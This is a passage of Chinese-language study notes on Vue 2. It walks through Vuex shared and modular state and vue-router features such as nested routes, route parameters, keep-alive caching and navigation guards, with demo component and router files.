}
</script>

<style scoped>
   button{
     margin-left: 5px;
   }
</style>
```

---

### 多组件共享数据

文件结构

![image](9F888B00E0FE48CDB406879A618A1EF7)

App.vue

```
<template>
   <div>
     <Count/>
     <hr/>
     <Person/>
   </div>
</template>

<script>
import Count from "@/components/Count";
import Person from "@/components/Person";
export default {
  name: "App",
  components:{
    Count,
    Person
  },
  mounted() {
    console.log('App', this);
  }
}
</script>
<style lang="css" scoped>

</style>
```

main.js
```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';
//引入store
import store from './store';

//关闭Vue的生产提示
Vue.config.productionTip = false;

new Vue({
    el: '#app',
    store,
    render: h => h(App),
});
```

store/index.js
```
/**
 * 该文件用于创建vuex中最核心的store
 */

//引入Vuex
import Vuex from 'vuex';
import Vue from "vue";

//使用vuex来集中管理状态,必要
//new store的前提是必须要使用Vuex插件
Vue.use(Vuex);

//创建actions(本质就是对象) 用于响应组件中的动作
const actions = {
    //收到上下文对象(包含commit)和dispatch过来的值
    // increment(context, value){
    //     context.commit('INCREMENT', value);
    // },
    // decrement(context, value){
    //     context.commit('DECREMENT', value);
    // },
    incrementIfOdd(context, value){
        // console.log(`action中的incrementIfOdd被调用`);
        // console.log('处理了一些事情');
        // context.dispatch('demo1', value);
        if(context.state.sum % 2) {
            console.log('@')
            context.commit('INCREMENT',value);
            // context.state.sum += 1;//这样可以实现但是记住本次对状态的改变开发者工具将无法捕获，因为开发者工具是对mutations对话的
        }
    },
    incrementWait(context, value){
        setTimeout(() => {
            context.commit('INCREMENT', value);
        },500)
    },
    // demo1(context, value){
    //     console.log('处理了一些事情---demo1');
    //     context.dispatch('demo2', value);
    // },
    // demo2(context, value){
    //     console.log('在action的demo中完成最终的逻辑');
    //     if(context.state.sum % 2) {
    //         console.log('@')
    //         context.commit('INCREMENT',value);
    //     }
    // }
}

//创建mutations(本质也是对象) 用于修改数据(state)
const mutations = {
    //收到state和要操作数value
    INCREMENT(state, value) {
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    },
    ADD_PERSON(state, value){
        state.personList.unshift(value);
    }
}

//准备getters用于加工state，将其共享于各个组件当中
const getters = {
    bigSum(state){
        return state.sum * 10;
    }
}

//准备state(数据) 存储数据
//类似于各个组件里的computed(计算属性),只不过它是共享的
const state = {
    sum: 0,
    school: 'Wust',
    subject: 'Computer Science',
    personList: [
        { id: '001', name: '张三'}
    ],
}


//创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
});
```

Count.vue
```
<template>
  <div>
    <h1>当前求和为: {{ sum }}</h1>
    <!--让其收集到的数据全是number类型的 number修饰符-->
    <h3>当前求和放大3倍为:{{ bigSum }}</h3>
    <h3>我在{{ school }}, 学习{{ subject }}</h3>
    <h3 style="color: red">下方列表的总人数 {{ personList.length }}</h3>
    <select v-model.number="n">
      <!--让所有的value全部绑定为数字-->
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementIfOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions} from 'vuex';
export default {
  //计数组件
  name: "Count",
  data(){
    return {
      n: 1,// 代表用户在select框开始的时候选择的数字
    }
  },
  computed:{
    //借助mapState从state中生成计算属性,对象写法
    // ... mapState({
    //   sum:'sum',
    //   school: 'school',
    //   subject: 'subject'
    // }),
    //借助mapState从state中生成计算属性,数组写法(即代表了生成的计算属性名为sum，同时也代表了从state找到sum)
    ... mapState(['sum', 'school', 'subject', 'personList']),

    //借助mapGetters从getters中生成计算属性,对象写法
    // ...mapGetters({ bigSum: 'bigSum' }),
    //借助mapGetters从getters中生成计算属性,数组写法
    ...mapGetters(['bigSum']),

  },
  methods:{
    // increment(){
    //   this.$store.commit('INCREMENT', this.n);
    // },
    // decrement(){
    //   this.$store.commit('DECREMENT', this.n);
    // },
    //借助mapMutations生成对应方法，方法会调用commit去联系mutations，对象写法
    ...mapMutations({
      increment: 'INCREMENT',
      decrement: 'DECREMENT',
    }),
    //借助数组写法生成方法,但注意你生成的方法名和mutations里对应的方法名将会一样的
    // ...mapMutations(['increment', 'decrement']),

    // incrementOdd(){
    //   this.$store.dispatch('incrementIfOdd', this.n);
    // },
    // incrementWait(){
    //   this.$store.dispatch('incrementWait', this.n);
    // }

    //借助mapMutations生成对应方法，方法会调用dispatch去联系actions，对象写法
    // ...mapActions({
    //   incrementIfOdd: 'incrementIfOdd',
    //   incrementWait: 'incrementWait',
    // }),

    ...mapActions(['incrementWait', 'incrementIfOdd']), //数组写法,同上
  },
}
</script>

<style scoped>
   button{
     margin-left: 5px;
   }
</style>
```

Person.vue
```
<template>
   <div>
     <h1>人员列表</h1>
     <h2 style="color:skyblue;">Count组件求和为:{{ sum }}</h2>
     <input type="text" placeholder="请输入名字" v-model="name" />
     <button @click="add">添加</button>
     <ul>
       <li v-for="p in personList" :key="p.id">{{ p.name }}</li>
     </ul>
   </div>
</template>

<script>
// import { mapState } from 'vuex';
import {nanoid} from "nanoid";
export default {
  name: "Person",
  data(){
    return {
      name: '',
    }
  },
  methods:{
     add(){
       const perObj = {
         id: nanoid(),
         name: this.name,
       }
       console.log(perObj);
       this.name = '';
       this.$store.commit('ADD_PERSON', perObj);
     }
  },
  computed:{
    // ...mapState(['personList']),
    personList(){
      return this.$store.state.personList;
    },
    sum(){
      return this.$store.state.sum;
    }
  },
}
</script>

<style scoped>
   button{
     margin-left: 5px;
   }
   ul{
     margin-top: 5px;
   }
</style>
```

---

### vuex模块化编程

文件结构

![image](C0ECEE9BFD3149DBB5E56C6E5F1B82E4)

main.js

```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';
//引入store
import store from './store';

//关闭Vue的生产提示
Vue.config.productionTip = false;

new Vue({
    el: '#app',
    store,
    render: h => h(App),
});
```

App.vue
```
<template>
   <div>
     <Count/>
     <hr/>
     <Person/>
   </div>
</template>

<script>
import Count from "@/components/Count";
import Person from "@/components/Person";
export default {
  name: "App",
  components:{
    Count,
    Person
  },
  mounted() {
    console.log('App', this);
  }
}
</script>
<style lang="css" scoped>

</style>
```

store/count.js
```
//求和功能配置
export default  {
    namespaced: true,
    state:{
        sum: 0,
        school: 'Wust',
        subject: 'Computer Science',
    },
    getters:{
        bigSum(state){
            return state.sum * 10;
        }
    },
    actions:{
        incrementIfOdd(context, value){
            // console.log(`action中的incrementIfOdd被调用`);
            // console.log('处理了一些事情');
            // context.dispatch('demo1', value);
            if(context.state.sum % 2) {
                console.log('@')
                context.commit('INCREMENT',value);
                // context.state.sum += 1;//这样可以实现但是记住本次对状态的改变开发者工具将无法捕获，因为开发者工具是对mutations对话的
            }
        },
        incrementWait(context, value){
            setTimeout(() => {
                context.commit('INCREMENT', value);
            },500)
        },
    },
    mutations:{
        INCREMENT(state, value) {
            state.sum += value;
        },
        DECREMENT(state, value) {
            state.sum -= value;
        },
    }
}
```

store/index.js
```
/**
 * 该文件用于创建vuex中最核心的store
 */

//引入Vuex
import Vuex from 'vuex';
import Vue from "vue";
import count from './count';
import person from './person';

//使用vuex来集中管理状态,必要
//new store的前提是必须要使用Vuex插件
Vue.use(Vuex);


//创建并暴露store
export default new Vuex.Store({
    modules:{
        count,
        person
    }
});
```

store/person.js
```
//人员列表配置
import axios from "axios";
import {nanoid} from "nanoid";
export default {
    namespaced: true,
    state:{
        personList: [
            { id: '001', name: '张三'}
        ],
    },
    getters:{
        firstPersonName(state){
            return state.personList[0].name;
        }
    },
    actions:{
        addPersonWang(context, value){
            if(value.name.indexOf('王') === 0){
                context.commit('ADD_PERSON',value);
            }else{
                alert('添加的人员必须姓王');
            }
        },
        //联系后端api
        addPersonServer(context){
            axios.get(`https://api.uixsj.cn/hitokoto/get?type=social`)
                .then(res => context.commit('ADD_PERSON',{
                    id: nanoid(),
                    name: res.data
                }))
                .catch(e => alert(e.message));
        }
    },
    mutations:{
        ADD_PERSON(state, value){
            state.personList.unshift(value);
        }
    }
}
```

Count.vue
```
<template>
  <div>
    <h1>当前求和为: {{ sum }}</h1>
    <!--让其收集到的数据全是number类型的 number修饰符-->
    <h3>当前求和放大3倍为:{{ bigSum }}</h3>
    <h3>我在{{ school }}, 学习{{ subject }}</h3>
    <h3 style="color: red">下方列表的总人数 {{ personList.length }}</h3>
    <select v-model.number="n">
      <!--让所有的value全部绑定为数字-->
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementIfOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions} from 'vuex';
export default {
  //计数组件
  name: "Count",
  data(){
    return {
      n: 1,// 代表用户在select框开始的时候选择的数字
    }
  },
  computed:{
    //借助mapState从state中生成计算属性,对象写法
    // ... mapState({
    //   sum:'sum',
    //   school: 'school',
    //   subject: 'subject'
    // }),
    //借助mapState从state中生成计算属性,数组写法(即代表了生成的计算属性名为sum，同时也代表了从state找到sum)
    ... mapState('count', ['sum', 'subject', 'school']),
    ...mapState('person', ['personList']),

    //借助mapGetters从getters中生成计算属性,对象写法
    // ...mapGetters({ bigSum: 'bigSum' }),
    //借助mapGetters从getters中生成计算属性,数组写法
    ...mapGetters('count',['bigSum']),

  },
  methods:{
    // increment(){
    //   this.$store.commit('INCREMENT', this.n);
    // },
    // decrement(){
    //   this.$store.commit('DECREMENT', this.n);
    // },
    //借助mapMutations生成对应方法，方法会调用commit去联系mutations，对象写法
    ...mapMutations('count',{
      increment: 'INCREMENT',
      decrement: 'DECREMENT',
    }),
    //借助数组写法生成方法,但注意你生成的方法名和mutations里对应的方法名将会一样的
    // ...mapMutations(['increment', 'decrement']),

    // incrementOdd(){
    //   this.$store.dispatch('incrementIfOdd', this.n);
    // },
    // incrementWait(){
    //   this.$store.dispatch('incrementWait', this.n);
    // }

    //借助mapMutations生成对应方法，方法会调用dispatch去联系actions，对象写法
    // ...mapActions({
    //   incrementIfOdd: 'incrementIfOdd',
    //   incrementWait: 'incrementWait',
    // }),

    ...mapActions('count',['incrementWait', 'incrementIfOdd']), //数组写法,同上
  },
}
</script>

<style scoped>
   button{
     margin-left: 5px;
   }
</style>
```

Person.vue
```
<template>
   <div>
     <h1>人员列表</h1>
     <h2 style="color:skyblue;">Count组件求和为:{{ sum }}</h2>
     <h3>列表中第一个人的名字是:{{ firstPersonName }}</h3>
     <input type="text" placeholder="请输入名字" v-model="name" />
     <button @click="add">添加</button>
     <button @click="addWang">添加一个姓王的人</button>
     <button @click="addPersonServer">添加一个人名字随机</button>
     <ul>
       <li v-for="p in personList" :key="p.id">{{ p.name }}</li>
     </ul>
   </div>
</template>

<script>
// import { mapState } from 'vuex';
import {nanoid} from "nanoid";
export default {
  name: "Person",
  data(){
    return {
      name: '',
    }
  },
  methods:{
     add(){
       const perObj = {
         id: nanoid(),
         name: this.name,
       }
       console.log(perObj);
       this.name = '';
       this.$store.commit('person/ADD_PERSON', perObj);
     },
    addWang(){
       const perObj = {
         id: nanoid(),
         name: this.name
       }
      this.$store.dispatch('person/addPersonWang', perObj);
      this.name = '';
    },
    addPersonServer(){
       this.$store.dispatch('person/addPersonServer');
    }
  },
  computed:{
    // ...mapState(['personList']),
    personList(){
      return this.$store.state.person.personList;
    },
    sum(){
      return this.$store.state.count.sum;
    },
    firstPersonName() {
      return this.$store.getters['person/firstPersonName'];
    }
  },
}
</script>

<style scoped>
   button{
     margin-left: 5px;
   }
   ul{
     margin-top: 5px;
   }
</style>
```

---

### 路由的简介

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=117

![image](BEBDDED4C7F9430CB040B329A01A7F6F)

![image](476D31E367EA42E9818C1B340DFED022)

![image](37D996C0F7574DDAB3804E28E7A25F41)

---

### 路由基本使用

文件结构

![image](37A4123124E34D60BC278745A68EEE10)

main.js

```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';
//引入vue-router
import VueRouter from "vue-router";
import router from './router';

//关闭Vue的生产提示
Vue.config.productionTip = false;

//应用vue-router插件
Vue.use(VueRouter);

new Vue({
    el: '#app',
    render: h => h(App),
    router
});
```

App.vue
```
<template>
  <div>
    <div class="row">
      <div class="col-xs-offset-2 col-xs-8">
        <div class="page-header"><h2>Vue Router Demo</h2></div>
      </div>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!--原始使用a标签跳转多个页面,多页面应用-->
<!--          <a class="list-group-item active" href="./about.html">About</a>-->
<!--          <a class="list-group-item" href="./home.html">Home</a>-->
          <!--vue中借助router=link标签实现路由的切换-->
          <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!--router-view确定视图的位置-->
            <router-view>
            </router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: "App",
}
</script>
<style lang="css" scoped>

</style>
```

router/index.js

```
//该文件专门用于创建整个应用的路由器

import VueRouter from "vue-router";
import About from "@/components/About";
import Home from '@/components/Home';

//创建并默认暴露一个路由器
export default new VueRouter({
   routes:[
       {
           path:'/about',
           component: About
       },
       {
           path:'/home',
           component: Home
       }
   ]
});
```

About.vue
```
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About"
}
</script>

<style scoped>

</style>
```

Home.vue
```
<template>
  <h2>我是Home的内容</h2>
</template>

<script>
export default {
  name: "Home"
}
</script>

<style scoped>
</style>
```





---

### 路由注意点

![image](394120412D3E4D10A26CB05EF5BB804B)

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=119

---

### 嵌套路由

文件结构

![image](099F9A77E69F4BF1A4B3C1473A9FFCBC)

main.js
```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';
//引入vue-router
import VueRouter from "vue-router";
import router from './router';

//关闭Vue的生产提示
Vue.config.productionTip = false;

//应用vue-router插件
Vue.use(VueRouter);

new Vue({
    el: '#app',
    render: h => h(App),
    router
});
```

App.vue
```
<template>
  <div>
    <div class="row">
      <Banner/>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!--原始使用a标签跳转多个页面,多页面应用-->
<!--          <a class="list-group-item active" href="./about.html">About</a>-->
<!--          <a class="list-group-item" href="./home.html">Home</a>-->
          <!--vue中借助router=link标签实现路由的切换-->
          <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!--router-view确定视图的位置-->
            <router-view>
            </router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from "@/components/Banner";
export default {
  name: "App",
  components: {Banner},
}
</script>
<style lang="css" scoped>

</style>
```

router/index.js
```
//该文件专门用于创建整个应用的路由器

import VueRouter from "vue-router";
import About from "@/pages/About";
import Home from '@/pages/Home';
import News from "@/pages/News";
import Message from "@/pages/Message";

//创建并默认暴露一个路由器
export default new VueRouter({
   routes:[
       {
           path:'/about',
           component: About
       },
       {
           path:'/home',
           component: Home,
           children:[
               {
                   path: 'news',
                   component: News
               },
               {
                   path: 'message',
                   component: Message
               }
           ]
       }
   ]
});
```

About.vue
```
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  // mounted() {
  //   console.log('Home组件挂载完毕', this);
  //   window.aboutRoute = this.$route;
  //   window.aboutRouter = this.$router;
  // },
  // beforeDestroy() {
  //   console.log('About组件即将被销毁');
  // }
}
</script>

<style scoped>

</style>
```

Home.vue
```
<template>
  <div>
    <h2>我是Home的内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/news">News</router-link>
        </li>
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/message">Message</router-link>
        </li>
      </ul>
      <router-view>
      </router-view>
    </div>
  </div>
</template>

<script>
export default {
  name: "Home",
  // mounted() {
  //   console.log('Home组件挂载完毕', this);
  //   window.homeRoute = this.$route;
  //   window.homeRouter = this.$router;
  // },
  // // beforeDestroy() {
  // //   console.log('Home组件将要被销毁');
  // // }
}
</script>

<style scoped>
</style>
```

Message.vue
```
<template>
  <div>
    <ul>
      <li>
        <a href="/message1">message001</a>&nbsp;&nbsp;
      </li>
      <li>
        <a href="/message2">message002</a>&nbsp;&nbsp;
      </li>
      <li>
        <a href="/message/3">message003</a>&nbsp;&nbsp;
      </li>
    </ul>
  </div>
</template>

<script>
export default {
  name: "Message"
}
</script>

<style scoped>

</style>
```

News.vue
```
<template>
  <ul>
    <li>news001</li>
    <li>news002</li>
    <li>news003</li>
  </ul>
</template>

<script>
export default {
  name: "News"
}
</script>

<style scoped>

</style>
```

Banner.vue
```
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header"><h2>Vue Router Demo</h2></div>
  </div>
</template>

<script>
export default {
  name: "Banner"
}
</script>

<style scoped>

</style>
```

---

### 路由传参query

![image](C1D27DD8DDC5464E839BDA8E256BC125)

改动

Message.vue
```
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!---跳转路由并携带query参数，to的字符串写法-->
        <!--<router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{ m.title }}</router-link>&nbsp;&nbsp;-->
        <!---跳转路由并携带query参数，to的对象写法-->
        <router-link
            :to="{
              path:'/home/message/detail',
              query:{
                id: m.id,
                title: m.title
              }
        }">
          {{ m.title }}
        </router-link>&nbsp;&nbsp;
      </li>
    </ul>
    <hr/>
    <router-view/>
  </div>
</template>

<script>
export default {
  name: "Message",
  data(){
    return {
      messageList:[
        {id: '001', title: '消息001'},
        {id: '002', title: '消息002'},
        {id: '003', title: '消息003'},
      ]
    }
  }
}
</script>

<style scoped>

</style>
```

Detail.vue
```
<template>
   <ul>
     <li>消息编号:{{ $route.query.id }}</li>
     <li>消息标题:{{ $route.query.title }}</li>
   </ul>
</template>

<script>
export default {
  name: "Detail",
  mounted() {
    console.log(this.$route);
  }
}
</script>

<style scoped>

</style>
```


---

### 命名路由

router/index.js

```
//该文件专门用于创建整个应用的路由器

import VueRouter from "vue-router";
import About from "@/pages/About";
import Home from '@/pages/Home';
import News from "@/pages/News";
import Message from "@/pages/Message";
import Detail from "@/pages/Detail";

//创建并默认暴露一个路由器
export default new VueRouter({
   routes:[
       {
           name: 'regard',
           path:'/about',
           component: About
       },
       {
           path:'/home',
           component: Home,
           children:[
               {
                   path: 'news',
                   component: News
               },
               {
                   path: 'message',
                   component: Message,
                   children:[
                       {
                           name: 'particulars',
                           path: 'detail',
                           component: Detail
                       }
                   ],
               }
           ]
       }
   ]
});
```

Message.vue
```
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!---跳转路由并携带query参数，to的字符串写法-->
        <!--<router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{ m.title }}</router-link>&nbsp;&nbsp;-->
        <!---跳转路由并携带query参数，to的对象写法-->
        <router-link
            :to="{
              // path:'/home/message/detail',
              name: 'particulars', //利用路由名字直接跳转路由简化多级路由的path配置
              query:{
                id: m.id,
                title: m.title
              }
        }">
          {{ m.title }}
        </router-link>&nbsp;&nbsp;
      </li>
    </ul>
    <hr/>
    <router-view/>
  </div>
</template>

<script>
export default {
  name: "Message",
  data(){
    return {
      messageList:[
        {id: '001', title: '消息001'},
        {id: '002', title: '消息002'},
        {id: '003', title: '消息003'},
      ]
    }
  }
}
</script>

<style scoped>

</style>
```

---

### 路由传params

改动

Message.vue
```
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!---跳转路由并携带params参数，to的字符串写法-->
<!--        <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{ m.title }}</router-link>&nbsp;&nbsp;-->
<!--        -跳转路由并携带params参数，to的对象写法-->
        <router-link
            :to="{
              // path:'/home/message/detail',
              name: 'particulars', //利用路由名字直接跳转路由简化多级路由的path配置
              //注意如果你这里使用params传递参数,不能配置path，只能配置name,一定要注意
              params: {
                id: m.id,
                title: m.title
              }
        }">
          {{ m.title }}
        </router-link>&nbsp;&nbsp;
      </li>
    </ul>
    <hr/>
    <router-view/>
  </div>
</template>

<script>
export default {
  name: "Message",
  data(){
    return {
      messageList:[
        {id: '001', title: '消息001'},
        {id: '002', title: '消息002'},
        {id: '003', title: '消息003'},
      ]
    }
  }
}
</script>

<style scoped>

</style>
```

router/index.js

```
//该文件专门用于创建整个应用的路由器

import VueRouter from "vue-router";
import About from "@/pages/About";
import Home from '@/pages/Home';
import News from "@/pages/News";
import Message from "@/pages/Message";
import Detail from "@/pages/Detail";

//创建并默认暴露一个路由器
export default new VueRouter({
   routes:[
       {
           name: 'regard',
           path:'/about',
           component: About
       },
       {
           path:'/home',
           component: Home,
           children:[
               {
                   path: 'news',
                   component: News
               },
               {
                   path: 'message',
                   component: Message,
                   children:[
                       {
                           name: 'particulars',
                           // 必须声明
                           path: 'detail/:id/:title',
                           component: Detail
                       }
                   ],
               }
           ]
       }
   ]
});

```

---

### 路由的props属性

改动

Message.vue

```
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!---跳转路由并携带params参数，to的字符串写法-->
<!--        <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{ m.title }}</router-link>&nbsp;&nbsp;-->
<!--        -跳转路由并携带params参数，to的对象写法-->
        <router-link
            :to="{
              // path:'/home/message/detail',
              name: 'particulars', //利用路由名字直接跳转路由简化多级路由的path配置
              //注意如果你这里使用params传递参数,不能配置path，只能配置name,一定要注意
              query: {
                id: m.id,
                title: m.title
              }
        }">
          {{ m.title }}
        </router-link>&nbsp;&nbsp;
      </li>
    </ul>
    <hr/>
    <router-view/>
  </div>
</template>

<script>
export default {
  name: "Message",
  data(){
    return {
      messageList:[
        {id: '001', title: '消息001'},
        {id: '002', title: '消息002'},
        {id: '003', title: '消息003'},
      ]
    }
  }
}
</script>

<style scoped>

</style>
```

Detail.vue
```
<template>
   <ul>
     <li>消息编号:{{ id }}</li>
     <li>消息标题:{{ title }}</li>
   </ul>
</template>

<script>
export default {
  name: "Detail",
  props: ['id', 'title']
  // mounted() {
  //   console.log(this.$route);
  // }
}
</script>

<style scoped>

</style>
```

router/index.js
```
//该文件专门用于创建整个应用的路由器

import VueRouter from "vue-router";
import About from "@/pages/About";
import Home from '@/pages/Home';
import News from "@/pages/News";
import Message from "@/pages/Message";
import Detail from "@/pages/Detail";

//创建并默认暴露一个路由器
export default new VueRouter({
   routes:[
       {
           name: 'regard',
           path:'/about',
           component: About
       },
       {
           path:'/home',
           component: Home,
           children:[
               {
                   path: 'news',
                   component: News
               },
               {
                   path: 'message',
                   component: Message,
                   children:[
                       {
                           name: 'particulars',
                           path: 'detail/:id/:title',
                           component: Detail,
                           //props的第一种写法值为对象,该对象的所有key-value都会以props的形式传给detail组件(死数据)
                           // props:{
                           //     a:1,
                           //     b:'hello'
                           // }
                           //props的第二种写法，值为布尔值,布尔值为真，就会把该路由组件收到的所有params(注意如果是query参数不会奏效的)参数以props的形式传递给detail组件
                           // props: true
                           //props的第三种写法,值为函数  $route.query.id
                           props({ query: { id, title } }){
                               return {
                                   id,
                                   title
                               }
                           }
                       }
                   ],
               }
           ]
       }
   ]
});
```

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=124

---

### router-link的replace属性



---

### 编程式路由导航

改动

Message.vue

```
//该文件专门用于创建整个应用的路由器

import VueRouter from "vue-router";
import About from "@/pages/About";
import Home from '@/pages/Home';
import News from "@/pages/News";
import Message from "@/pages/Message";
import Detail from "@/pages/Detail";

//创建并默认暴露一个路由器
export default new VueRouter({
   routes:[
       {
           name: 'regard',
           path:'/about',
           component: About
       },
       {
           path:'/home',
           component: Home,
           children:[
               {
                   path: 'news',
                   component: News
               },
               {
                   path: 'message',
                   component: Message,
                   children:[
                       {
                           name: 'particulars',
                           path: 'detail/:id/:title',
                           component: Detail,
                           //props的第一种写法值为对象,该对象的所有key-value都会以props的形式传给detail组件(死数据)
                           // props:{
                           //     a:1,
                           //     b:'hello'
                           // }
                           //props的第二种写法，值为布尔值,布尔值为真，就会把该路由组件收到的所有params(注意如果是query参数不会奏效的)参数以props的形式传递给detail组件
                           // props: true
                           //props的第三种写法,值为函数  $route.query.id
                           props({ query: { id, title } }){
                               return {
                                   id,
                                   title
                               }
                           }
                       }
                   ],
               }
           ]
       }
   ]
});
```

---

### 缓存路由组件

改动

Home.vue
```
<template>
  <div>
    <h2>我是Home的内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/news">News</router-link>
        </li>
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/message">Message</router-link>
        </li>
      </ul>
      <!--include的值代表要缓存的组件，比如下面代表在Home组件中要缓存News组件(组件名)-->
      <!--如果要缓存多个路由组件就改写为:include="['News', 'Message']"-->
      <keep-alive include="News">
        <router-view>
        </router-view>
      </keep-alive>
    </div>
  </div>
</template>

<script>
export default {
  name: "Home",
  // mounted() {
  //   console.log('Home组件挂载完毕', this);
  //   window.homeRoute = this.$route;
  //   window.homeRouter = this.$router;
  // },
  // // beforeDestroy() {
  // //   console.log('Home组件将要被销毁');
  // // }
}
</script>

<style scoped>
</style>
```

News.vue
```
<template>
  <ul>
    <li>news001 <input type="text"/></li>
    <li>news002 <input type="text"/></li>
    <li>news003 <input type="text"/></li>
  </ul>
</template>

<script>
export default {
  name: "News",
  beforeDestroy() {
    console.log('News组件将要被销毁')
  }
}
</script>

<style scoped>

</style>
```

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=127

---

### 2个生命周期函数

文件改动

News.vue

```
<template>
  <ul>
    <li :style="{opacity}">欢迎学习vue</li>
    <li>news001 <input type="text"/></li>
    <li>news002 <input type="text"/></li>
    <li>news003 <input type="text"/></li>
  </ul>
</template>

<script>
export default {
  name: "News",
  data(){
    return {
      opacity: 1
    }
  },
  // mounted() {
  //   this.timer = setInterval(() => {
  //     console.log('@')
  //     this.opacity -= 0.01;
  //     if(this.opacity <= 0) this.opacity = 1;
  //   },16);
  // },
  //
  // beforeDestroy() {
  //   console.log('News组件将要被销毁');
  //   clearInterval(this.timer);
  // },

  //激活(路由组件独有的两个钩子)
  activated() {
    console.log('News组件被激活');
      this.timer = setInterval(() => {
        console.log('@')
        this.opacity -= 0.01;
        if(this.opacity <= 0) this.opacity = 1;
      },16);
  },
  //失活
  deactivated() {
    console.log('News组件失活了');
    clearInterval(this.timer);
  }
}
</script>

<style scoped>

</style>
```

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=128

---

### 路由守卫

改动

```
//该文件专门用于创建整个应用的路由器

import VueRouter from "vue-router";
import About from "@/pages/About";
import Home from '@/pages/Home';
import News from "@/pages/News";
import Message from "@/pages/Message";
import Detail from "@/pages/Detail";

//创建一个路由器
const router = new VueRouter({
   routes:[
       {
           name: 'regard',
           path:'/about',
           component: About,
           meta:{
               title: '关于'
           }
       },
       {
           name:'homepage',
           path:'/home',
           component: Home,
           meta:{
               title: '主页'
           },
           children:[
               {
                   name: 'ns',
                   path: 'news',
                   component: News,
                   //meta:路由元信息，可以配置是否需要校验的信息
                   meta:{
                       isAuth: true,
                       title: '新闻'
                   }
               },
               {
                   name:'msg',
                   path: 'message',
                   component: Message,
                   children:[
                       {
                           name: 'particulars',
                           path: 'detail',
                           component: Detail,
                           
                           //props的第三种写法,值为函数  $route.query.id
                           props({ query: { id, title } }){
                               return {
                                   id,
                                   title
                               }
                           }
                       }
                   ],
                   //meta:路由元信息，可以配置是否需要校验的信息
                   meta:{
                       isAuth: true,
                       title: '消息'
                   }
               }
           ]
       }
   ]
});

//全局前置路由守卫
//初始化和在每一次路由切换之前被调用
router.beforeEach((to, from, next) => {
    // console.log(to, from);
    console.log('前置路由守卫');
    const { isAuth } = to.meta;
    if(isAuth){
        //代表需要鉴权
        if(localStorage.getItem('school') === 'wust1') next();//类似于nodejs中间件
        else alert('无权限');
    }else{
        next();
    }
});

//全局后置路由守卫
//初始化和在每一次路由切换之后被调用
router.afterEach(( to, from ) => {
    console.log('后置路由守卫', to, from);
    //点击每一个路由都切换西夏document.title
    const { title } = to.meta;
    document.title = title || 'vue-advance';
})

export default router;
```

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=129

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=130

---

### 独享路由守卫

改动

router/index.js
```
//该文件专门用于创建整个应用的路由器

import VueRouter from "vue-router";
import About from "@/pages/About";
import Home from '@/pages/Home';
import News from "@/pages/News";
import Message from "@/pages/Message";
import Detail from "@/pages/Detail";

//创建一个路由器
const router = new VueRouter({
   routes:[
       {
           name: 'regard',
           path:'/about',
           component: About,
           meta:{
               title: '关于'
           }
       },
       {
           name:'homepage',
           path:'/home',
           component: Home,
           meta:{
               title: '主页'
           },
           children:[
               {
                   name: 'ns',
                   path: 'news',
                   component: News,
                   //meta:路由元信息，可以配置是否需要校验的信息
                   meta:{
                       isAuth: true,
                       title: '新闻'
                   },
                   //独享路由守卫
                   beforeEnter(to,from,next){
                       const { isAuth } = to.meta;
                       if(isAuth){
                            //代表需要鉴权
                            if(localStorage.getItem('school') === 'wust1') next();//类似于nodejs中间件
                            else alert('无权限');
                        }else{
                            next();
                        }
                   }
               },
               {
                   name:'msg',
                   path: 'message',
                   component: Message,
                   children:[
                       {
                           name: 'particulars',
                           path: 'detail',
                           component: Detail,
                           
